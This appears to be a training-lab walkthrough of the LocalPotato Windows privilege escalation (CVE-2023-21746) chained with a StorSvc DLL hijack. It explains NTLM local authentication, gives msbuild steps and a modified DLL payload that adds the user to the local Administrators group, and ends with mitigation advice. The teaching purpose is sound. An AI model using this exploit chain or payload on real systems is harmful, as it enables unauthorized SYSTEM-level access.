A local privilege escalation (LPE) vulnerability in Windows was reported to Microsoft on September 9, 2022, by Andrea Pierini (@decoder_it) and Antonio Cocomazzi (@splinter_code). The vulnerability would allow an attacker with a low-privilege account on a host to read/write arbitrary files with SYSTEM privileges.

Microsoft released a fix for the vulnerability in the January 2023 patch Tuesday, and a working Proof-of-Concept (PoC) was later released on February 10, 2023. The vulnerability was assigned CVE-2023-21746.

While the vulnerability in itself wouldn't directly allow executing commands as SYSTEM, we can combine it with several vectors to achieve this result. Conveniently, on February 13, another privilege escalation PoC was published by BlackArrowSec that abuses the StorSvc service, allowing an attacker to execute code as SYSTEM as long as they can write a DLL file to any directory in the PATH.

In this room, we will look at both vulnerabilities and combine them to get arbitrary execution as the SYSTEM user.

Before going into how the vulnerability works, let's do a quick refresher on NTLM authentication.

NTLM Authentication

The usual case of NTLM authentication involves a user trying to authenticate to a remote server. Three packets are involved in the authentication process:

Type 1 Message: The client sends a packet to negotiate the terms of the authentication process. The packet optionally contains the name of the client machine and its domain. The server receives the packet and can check that authentication was started from a different machine.
Type 2 Message: The server responds to the client with a challenge. The "challenge" is a random number used to authenticate the client without having to pass their credentials through the network.
Type 3 Message: The client uses the challenge received on the Type 2 message and combines it with the user's password hash to generate a response to the challenge. The response is sent to the server as part of the Type 3 message. That way, the server can check if the client knows the correct user's password hash without transferring it through the network. 
NTLM Authentication

NTLM Local Authentication

NTLM local authentication is used when a user tries to log into a service running on the same machine. Since both the client and server applications reside on the same machine, there is no need for the challenge-response process. Authentication is instead performed differently by setting up a Security Context. While we won't dive into the details of what is contained in a Security Context, think of it as a set of security parameters associated with a connection, including the session key and the user whose privileges will be used for the connection.

The process still involves the same three messages as before, but the information used for authentication changes as follows:

Type 1 Message: The client sends this message to start the connection. It is used to negotiate authentication parameters just like before but also contains the name of the client machine and its domain. The server can check the client's name and domain, and the local authentication process begins if they match their own.

Type 2 Message: The server creates a Security Context and sends back its ID to the client in this message. The client can then use the Security Context ID to associate itself with the connection.

Type 3 Message: If the client successfully associates themselves with an existing Security Context ID, an empty Type 3 message is sent back to the server to signal that the local authentication process succeeded.
NTLM Local Authentication

![image](https://user-images.githubusercontent.com/47429862/223488098-123e4e41-fde3-4f41-a178-b7a1d054e258.png)

So far, we have used LocalPotato to write arbitrary files to the target machine. To get a privileged shell, we still need to figure out how to use the arbitrary write to run a command.

Recently, another privilege escalation vector was found, where an attacker could hijack a missing DLL to run arbitrary commands with SYSTEM privileges. The only problem with this vector was that an attacker would need to write a DLL into the system's PATH to trigger it. By default, Windows PATH will only include directories that only privileged accounts can write. While it might be possible to find machines where the installation of specific applications has altered the PATH variable and made the machine vulnerable, the attack vector only applies to particular scenarios. Combining this attack with LocalPotato allows us to overcome this restriction and have a fully working privilege escalation exploit.

StorSvc and DLL Hijacking

As discovered by BlackArrowSec, an attacker can send an RPC call to the SvcRebootToFlashingMode method provided by the StorSvc service, which in turn will end up triggering an attempt to load a missing DLL called SprintCSP.dll. 

Abusing StorSvc for LPE

If you are not familiar with RPC, think of it as an API that exposes functions so that they can be used remotely. In this case, the StorSvc service exposes the SvcRebootToFlashingMode method, which anyone with access to the machine can call.

Since StorSvc runs with SYSTEM privileges, creating SprintCSP.dll somewhere in the PATH will get it loaded whenever a call to SvcRebootToFlashingMode is made.

Compiling the Exploit

To make use of this exploit, you will first need to compile both of the provided files:

SprintCSP.dll: This is the missing DLL we are going to hijack. The default code provided with the exploit will run the whoami command and output the response to C:\Program Data\whoamiall.txt. We will need to change the command to run a reverse shell.
RpcClient.exe: This program will trigger the RPC call to SvcRebootToFlashingMode. Depending on the Windows version you are targeting, you may need to edit the exploit's code a bit, as different Windows versions use different interface identifiers to expose SvcRebootToFlashingMode.
The projects for both files can be found on C:\tools\LPE via StorSvc\.

Let's start by dealing with RpcClient.exe. As previously mentioned, we will need to change the exploit depending on the Windows version of the target machine. To do this, we will need to change the first lines of C:\tools\LPE via StorSvc\RpcClient\RpcClient\storsvc_c.c so that the correct operating system is chosen. We can use Notepad++ by right-clicking on the file and selecting Edit with Notepad++. Since our machine is running Windows Server 2019, we will edit the file to look as follows:

#if defined(_M_AMD64)

//#define WIN10
//#define WIN11
#define WIN2019
//#define WIN2022

...
This will set the exploit to use the correct RPC interface identifier for Windows 2019. Now that the code has been corrected, let's open a developer's command prompt using the shortcut on your desktop. We will build the project by running the following commands:

Command Prompt
C:\> cd C:\tools\LPE via StorSvc\RpcClient\

C:\tools\LPE via StorSvc\RpcClient> msbuild RpcClient.sln
... some output ommitted ...

Build succeeded.
    0 Warning(s)
    0 Error(s)

C:\tools\LPE via StorSvc\RpcClient> move x64\Debug\RpcClient.exe C:\Users\user\Desktop\ 
The compiled executable will be found on your desktop.

Now to compile SprintCSP.dll, we only need to modify the DoStuff() function on C:\tools\LPE via StorSvc\SprintCSP\SprintCSP\main.c so that it executes a command that grants us privileged access to the machine. For simplicity, we will make the DLL add our current user to the Administrators group. Here's the code with our replaced command:

void DoStuff() {

    // Replace all this code by your payload
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;
    CreateProcess(L"c:\\windows\\system32\\cmd.exe",L" /C net localgroup administrators user /add",
        NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, L"C:\\Windows", &si, &pi);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return;
}
We now compile the DLL and move the result back to our desktop:

Command Prompt
```
C:\> cd C:\tools\LPE via StorSvc\SprintCSP\

C:\tools\LPE via StorSvc\SprintCSP> msbuild SprintCSP.sln
... some output ommitted ...

Build succeeded.
    6 Warning(s)
    0 Error(s)

C:\tools\LPE via StorSvc\SprintCSP> move x64\Debug\SprintCSP.dll C:\Users\user\Desktop\ 
We are now ready to launch the full exploit chain!
```

## Mitigation

To prevent such attacks, consider the following points.

Patch updates:

Stay updated with security patches - The localpotato exploit targets a vulnerability in the Windows operating system. Ensure all systems are updated with the latest security patches to prevent attackers from exploiting this vulnerability. This vulnerability does not affect the patched OS.

Least Privilege Principle:

One way to prevent attackers from exploiting the localpotato exploit is to implement the principle of least privilege. This means limiting user access to only the resources they need to perform their job functions. By doing so, attackers are less likely to gain the elevated privileges required to execute the exploit.

Monitor for suspicious activity:

Use tools like Splunk to monitor suspicious activity on your network. Look for signs of a localpotato attack, such as unusual process activity or attempts to execute malicious code.
